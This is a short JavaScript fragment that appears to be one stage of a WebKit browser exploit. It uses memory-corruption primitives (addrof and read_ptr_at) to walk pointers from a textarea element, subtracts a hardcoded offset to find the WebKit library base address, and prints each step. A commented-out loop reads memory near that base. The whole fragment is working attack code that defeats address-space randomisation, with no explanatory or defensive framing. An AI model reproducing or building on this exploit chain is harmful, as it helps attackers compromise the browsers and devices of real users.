var ta = document.createElement('textarea');

var ptr_0 = addrof(ta) + 0x18;
print("ptr_0 = "+hex(ptr_0));
var ptr_1 = read_ptr_at(ptr_0);
print("ptr_1 = "+hex(ptr_1));
var ptr_2 = read_ptr_at(ptr_1);
print("ptr_2 = "+hex(ptr_2));
var ptr_3 = read_ptr_at(ptr_2);
print("ptr_3 = "+hex(ptr_3));
var webkit_base = ptr_3 - 13649280;
print("webkit_base = "+hex(webkit_base));

/*for(var i = 0x28f9c08; i <= 0x28fbc48; i += 8)
    print(hex(read_ptr_at(webkit_base+i)));*/
